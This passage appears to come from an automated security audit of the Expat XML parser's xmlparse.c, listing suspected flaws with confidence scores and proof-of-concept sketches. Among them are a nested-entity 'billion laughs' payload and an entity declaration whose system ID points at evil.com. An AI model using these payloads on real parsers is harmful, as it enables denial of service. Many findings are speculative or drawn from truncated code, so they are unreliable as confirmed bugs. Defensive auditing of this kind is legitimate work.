*PoC sketch:* In a UTF-16 build of Expat (sizeof(XML_Char) == 2), craft an XML document with a namespace URI of length >= 2^31 (if int is 32-bit). The multiplication `uriLen * 2` overflows, causing sip24_update to process fewer bytes than the actual URI length, producing a colliding hash.

### `xmlparse.c [doProlog D: ENTITY-declarations]` — L34 — conf=0.6
**Silent Entity Redefinition with Incomplete State**

When an entity is redeclared, lookup() returns the existing entity entry. The code detects this via (parser->m_declEntity->name != name), discards the new name via poolDiscard, and sets parser->m_declEntity = NULL. Setting m_declEntity to NULL causes all subsequent role handlers for this entity declaration (systemId, publicId, notation, content) to skip their processing because they guard on m_declEntity being non-NULL. While this aligns with the XML specification's 'first declaration wins' rule, it creates a subtle hazard: if the first declaration was partial or if handler callbacks were alre…

*PoC sketch:* <?xml version='1.0'?> <!DOCTYPE foo [   <!ENTITY ent SYSTEM "http://evil.com/first-systemId">   <!ENTITY ent PUBLIC "second-publicId" "http://legit.com/second-systemId"> ]> <foo/>

### `xmlparse.c [doContent A: entry+startTag]` — L14 — conf=0.6
**Potential NULL Pointer Dereference of m_openInternalEntities**

In the `else` branch of the encoding check, the code dereferences `parser->m_openInternalEntities` without verifying that it is not NULL. If `enc != parser->m_encoding` but `m_openInternalEntities` is NULL (e.g., due to state corruption, an unexpected API interaction, or a prior use-after-free clearing this pointer), this will result in a NULL pointer dereference, causing a denial of service (application crash).

*PoC sketch:* This would require manipulating the parser state such that `enc != parser->m_encoding` while `m_openInternalEntities` is NULL. While normal API usage typically ensures `m_openInternalEntities` is populated when parsing internal entities, state corruption via a separate vulnerability could trigger th…

### `xmlparse.c [doContent B: endTag-level]` — L18 — conf=0.6
**Incomplete entity expansion accounting for internal entities**

The accountingDiffTolerated() call for entity expansion accounting is only performed for predefined entities (e.g., &amp;, &lt;) under the XML_GE == 1 guard. When a user-defined internal entity is processed via processInternalEntity() on line 67, the expansion size accounting in this code path is not visible. If processInternalEntity() does not properly account for the full expansion depth and size, deeply nested or recursively expanding entities (billion laughs variant) could exhaust memory or CPU. The partial accounting here for predefined entities only covers a small fraction of the entity …

*PoC sketch:* <?xml version="1.0"?> <!DOCTYPE doc [   <!ENTITY x0 "text">   <!ENTITY x1 "&x0;&x0;&x0;&x0;&x0;&x0;&x0;&x0;&x0;&x0;">   <!ENTITY x2 "&x1;&x1;&x1;&x1;&x1;&x1;&x1;&x1;&x1;&x1;">   <!ENTITY x3 "&x2;&x2;&x2;&x2;&x2;&x2;&x2;&x2;&x2;&x2;"> ]> <doc>&x3;</doc>

### `xmlparse.c [addBinding A: URI-lookup+malloc]` — L48 — conf=0.5
**Signed integer overflow causes undefined behavior in URI loop**

The for-loop `for (len = 0; uri[len]; len++)` increments `len` (a signed int) without bounds checking. In C, signed integer overflow is undefined behavior, meaning the compiler is free to assume it never happens and optimize accordingly. This could cause the loop to behave unexpectedly — for example, the compiler might optimize away the overflow check `len > xmlLen` since it assumes `len` is always positive, potentially leading to out-of-bounds array access on xmlNamespace or xmlnsNamespace.

*PoC sketch:* With aggressive compiler optimizations (-O2 or -O3), the compiler may assume len never overflows and optimize the bounds check `len > xmlLen` away, potentially allowing access to xmlNamespace beyond its bounds if len wraps to a negative value that compares as less than xmlLen.

### `xmlparse.c [appendAttrValue C: pool-append-completion]` — L14 — conf=0.5
**Entity Open State Not Cleaned Up on Allocation Failure in Recursive Path**

If the recursive call to appendAttributeValue fails (e.g., due to pool memory allocation failure returning XML_ERROR_NO_MEMORY), the code correctly sets entity->open = XML_FALSE and calls entityTrackingOnClose before checking the result. However, if entityTrackingOnClose or the pool reallocation during the recursive call triggers a longjmp or other non-local exit (depending on surrounding infrastructure), the entity could remain marked as open (entity->open = XML_TRUE), causing subsequent references to the same entity to be incorrectly rejected as circular references, or worse, creating incons…

*PoC sketch:* Craft an XML document with an entity reference in an attribute value where the entity's expanded content is large enough to trigger a pool allocation failure, then reference the same entity again later in the document. The second reference may be incorrectly treated as a circular reference.

### `xmlparse.c [doProlog E: ATTLIST-declarations]` — L67 — conf=0.5
**Pointer underflow in nxt calculation for quantified content elements**

When a content element has a quantifier (?, *, +), the pointer `nxt` is computed as `next - enc->minBytesPerChar`. If `next` points near the beginning of the input buffer, subtracting minBytesPerChar could cause nxt to point before the buffer start. This underflowed pointer is then passed to getElementType(), which reads from the [s, nxt) range, potentially reading out-of-bounds memory.

*PoC sketch:* Craft an XML DTD with an element declaration whose content model references an element with a quantifier at a position where the parser's `next` pointer is at the earliest possible buffer offset, e.g.: <!DOCTYPE doc [ <!ELEMENT doc (a+)> ]> <doc><a/></doc>

### `xmlparse.c [doContent B: endTag-level]` — L68 — conf=0.5
**Missing return after processInternalEntity error check**

The code calls processInternalEntity() and begins checking if result != XML_ERROR_NONE, but the snippet is truncated. If the error handling block is missing a 'return result;' statement, execution would fall through after detecting an error from internal entity processing. This could lead to undefined behavior — continuing to process after an entity expansion error could result in use of uninitialized or corrupted parser state, potentially leading to crashes or exploitable conditions.

*PoC sketch:* An internal entity that triggers an error during processing (e.g., malformed content within an entity definition) could cause processInternalEntity to return a non-XML_ERROR_NONE result. If the error is not properly returned up the call stack, parsing continues in an inconsistent state.

### `xmlparse.c [doContent F: error+EOF]` — L21 — conf=0.5
**Potential infinite loop in XmlConvert with malformed encoding**

The for(;;) loop on line 21 relies on XmlConvert returning XML_CONVERT_COMPLETED or XML_CONVERT_INPUT_INCOMPLETE to break. If XmlConvert encounters a malformed encoding sequence that causes it to neither advance `s` nor return a completion status, the loop will iterate indefinitely. While `s` is passed by reference and should be advanced by XmlConvert, a buggy or maliciously crafted encoding converter could fail to advance the pointer, causing an infinite loop and denial of service.

*PoC sketch:* Provide XML input with a specially crafted encoding that triggers MUST_CONVERT but causes XmlConvert to return neither XML_CONVERT_COMPLETED nor XML_CONVERT_INPUT_INCOMPLETE while not advancing the source pointer `s`. This would cause the loop to spin indefinitely, consuming CPU resources.


## 🔵 LOW (7)

### `xmlparse.c [addBinding B: prefix-chain-update]` — L5 — conf=0.9
**Signed integer overflow on len++ when len equals INT_MAX**

The increment 'len++' at line 5-6 occurs without checking whether len is already INT_MAX. If len equals INT_MAX (possible with a crafted ~2GB namespace URI), the increment causes signed integer overflow, which is undefined behavior in C. In practice, this could wrap len to INT_MIN or another value. The subsequent overflow check 'if (len > INT_MAX - EXPAND_SPARE)' would not catch this because a wrapped negative value would be less than INT_MAX - EXPAND_SPARE. This could lead to incorrect buffer allocation size calculations and potentially a heap buffer overflow during the memcpy. While triggeri…

*PoC sketch:* Craft an XML document with a namespace URI attribute value of approximately INT_MAX (2,147,483,647) XML_Characters in length. This requires substantial memory but is theoretically possible on systems with enough RAM. The len++ would overflow, bypassing the subsequent overflow check.

### `xmlparse.c [storeAtts A: setup+default-attrs]` — L64 — conf=0.6
**Incomplete size_t overflow check for REALLOC multiplication on 64-bit platforms**

The overflow check for parser->m_attsSize * sizeof(ATTRIBUTE) is conditionally compiled under #if UINT_MAX >= SIZE_MAX. On mainstream 64-bit platforms (x86_64, AArch64) where UINT_MAX (2^32-1) < SIZE_MAX (2^64-1), this check is entirely omitted. While the multiplication cannot practically overflow size_t on these platforms because parser->m_attsSize is a 32-bit int (max ~2.1 billion) and sizeof(ATTRIBUTE) is small, the absence of the check violates defense-in-depth principles. On unusual or future architectures where int is wider or size_t is narrower relative to int, this could allow an integ…

*PoC sketch:* On a theoretical platform where sizeof(int)==sizeof(size_t)==4 but UINT_MAX < SIZE_MAX (non-standard but possible with padding bits), parser->m_attsSize could be up to INT_MAX (~2.1 billion). If sizeof(ATTRIBUTE) is, e.g., 4, then parser->m_attsSize * sizeof(ATTRIBUTE) could reach ~8.6 billion, over…

### `xmlparse.c [addBinding B: prefix-chain-update]` — L14 — conf=0.6
**Incomplete integer overflow check for multiplication on 32-bit platforms**

The preprocessor guard '#if UINT_MAX >= SIZE_MAX' at line 16 means the overflow check for 'sizeof(XML_Char) * (len + EXPAND_SPARE)' is only compiled on platforms where unsigned int can represent all size_t values. On standard ILP32 platforms where UINT_MAX == SIZE_MAX, the check IS compiled and works correctly. However, on unusual platforms where UINT_MAX < SIZE_MAX but sizeof(XML_Char) * (len + EXPAND_SPARE) could still overflow size_t, the check would be skipped. In practice, on LP64 platforms (x86_64), size_t is 64-bit so overflow is impossible given the INT_MAX constraint on len, making th…

*PoC sketch:* This is a defensive coding concern rather than an immediately exploitable vulnerability. On standard platforms (ILP32, LP64), the check behaves correctly. A hypothetical platform with 32-bit size_t but 16-bit unsigned int could potentially bypass the check.

### `xmlparse.c [doProlog B: DOCTYPE+subset]` — L76 — conf=0.6
**Unconditional dtd->hasParamEntityRefs set to TRUE on DOCTYPE_PUBLIC_ID without actual PE reference**

In the XML_ROLE_DOCTYPE_PUBLIC_ID case, dtd->hasParamEntityRefs is unconditionally set to XML_TRUE, even outside the if (parser->m_startDoctypeDeclHandler) block. This means that merely having a DOCTYPE with a public ID (even without any parameter entity references) marks the DTD as having param entity refs. This could alter parser behavior in ways that bypass security checks or change entity expansion semantics, potentially weakening the amplification limit protections that gate on hasParamEntityRefs.

*PoC sketch:* <?xml version="1.0"?> <!DOCTYPE foo PUBLIC "-//Safe//DTD//EN" "http://example.com/safe.dtd"> <foo/>

### `xmlparse.c [appendAttrValue B: entity-ref-expand]` — L24 — conf=0.55
**Silent Entity Skip Without Error Reporting May Lead to Data Injection**

When `checkEntityDecl` is false and the entity lookup returns NULL (undefined entity), the code silently breaks out of the expansion loop without reporting any error or invoking the skipped entity handler (lines 24-28, with commented-out handler code). This means undefined entity references in attribute values are silently dropped rather than reported. An attacker could exploit this to craft XML where critical entity references are silently removed, potentially altering the semantic meaning of attribute values in security-sensitive contexts (e.g., removing signature-related entities). The comm…

*PoC sketch:* <?xml version="1.0"?><!DOCTYPE doc [<!ENTITY % pe "whatever">%pe;]><doc attr="&undefined_entity;valid_data"/>. Since hasParamEntityRefs is true and standalone is false, checkEntityDecl is false, and &undefined_entity; is silently dropped, resulting in the attribute value being just 'valid_data' with…

### `xmlparse.c [appendAttrValue A: tokenizer-loop]` — L64 — conf=0.5
**Predefined entity expansion accounting without enforcement**

For predefined entities (amp, lt, gt, apos, quot), the code calls accountingDiffTolerated() with XML_ACCOUNT_ENTITY_EXPANSION but ignores its return value (the comment says 'recording without protection'). While predefined entities are indeed non-amplifying (5-6 input chars → 1 output char), the initial accountingDiffTolerated() call at the top of the loop measures raw token size, not expansion ratio. If the accounting logic has edge cases where the initial check passes but cumulative expansion from many predefined entities still exceeds safe limits, the bypass of the return value here could a…

*PoC sketch:* Construct an attribute value with an extremely large number of predefined entity references (e.g., attr='&amp;&amp;&amp;...' repeated millions of times). Each individual reference passes the amplification check, but the cumulative memory usage for the expanded attribute value could be significant.

### `xmlparse.c [appendAttrValue C: pool-append-completion]` — L10 — conf=0.35
**Potential Integer Overflow in textEnd Calculation**

The calculation `entity->textPtr + entity->textLen` to derive `textEnd` could theoretically wrap around if entity->textLen is close to SIZE_MAX and entity->textPtr is non-zero, resulting in textEnd pointing before textPtr. This would cause appendAttributeValue to process with an inverted range, potentially reading out of bounds or causing other undefined behavior. While entity->textLen is typically well-controlled, a corrupted entity structure (e.g., via a separate memory corruption bug) could trigger this.

*PoC sketch:* No direct PoC; would require a prior memory corruption to set entity->textLen to an abnormally large value. This is a defensive programming concern.


## ⚪ INFO (1)

### `xmlparse.c [storeAtts E: addBinding-calls]` — L41 — conf=0.7
**Incomplete String Comparison in Duplicate Attribute Detection**

The duplicate attribute check compares s1 (null-terminated) against s2 (explicitly noted as NOT null-terminated). The loop stops when `*s1 == 0`, and then `if (*s1 == 0)` declares a duplicate. However, this only verifies that s1 ended — it does not verify that s2 also ended at the same position. If s2 is longer than s1 (e.g., s1='abc\0', s2='abcdef'), the code would falsely declare a duplicate. Conversely, if s2 is shorter and not null-terminated, the loop reads past s2's buffer (buffer over-read). This logic error can cause false positive duplicate detection, rejecting valid XML documents, or…

*PoC sketch:* Register two namespace-prefixed attributes where one's uriName is a prefix of the other (e.g., 'http://a' and 'http://ab'). If the shorter one is stored first as s2 (not null-terminated in the hash table), the longer one as s1 will match all of s2's characters and then the comparison stops at s1's r…

